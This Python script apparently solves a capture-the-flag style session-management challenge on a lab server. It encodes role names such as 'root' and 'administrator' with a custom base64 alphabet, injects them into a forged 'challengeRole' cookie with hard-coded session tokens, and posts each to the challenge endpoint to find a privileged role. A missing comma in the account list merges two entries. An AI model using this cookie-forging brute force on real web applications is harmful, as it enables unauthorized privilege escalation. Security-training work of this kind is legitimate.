import base64
import requests


def encode(text):
    atom128 = "/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC"
    base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="

    lookup = dict(zip(base, atom128))
    b64 = base64.urlsafe_b64encode(text.encode()).decode('utf-8')
    result = "".join([lookup[x] for x in b64])
    return result


def insert_cookie(acc_list):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }

    data = {
        'returnUserRole': 'false',
        'returnPassword': 'false',
        'adminDetected': 'false'
    }

    for acc in acc_list:
        cookies = {
            'JSESSIONID': 'E7F56EF6096E7EDF2FCB7E31618656E9',
            'JSESSIONID3': '"FGDITjs+dL2y71uOrRHd2Q=="',
            'challengeRole': encode(acc),
            'currentPerson': 'YUd1ZXN0',
            'token': ' - 155274901898939653757529647652077425230',
        }

        response = requests.post(
            url='https://172.50.1.5:9443/challenges/714d8601c303bbef8b5cabab60b1060ac41f0d96f53b6ea54705bb1ea4316334',
            data=data, headers=headers, cookies=cookies, verify=False)
        print(f'{response.text} with: {acc}')


if __name__ == '__main__':
    acc_list = [
        'aGuest', 'manager', 'sean', 'root', 'administrator', 'privileged', 'seanduggan', 'markdenihan', 'mark',
        'superuser', 'megauser', 'hyperuser', 'godzilla', 'kinguser', 'rootuser', 'adminuser'  'shepherd']
    insert_cookie(acc_list)
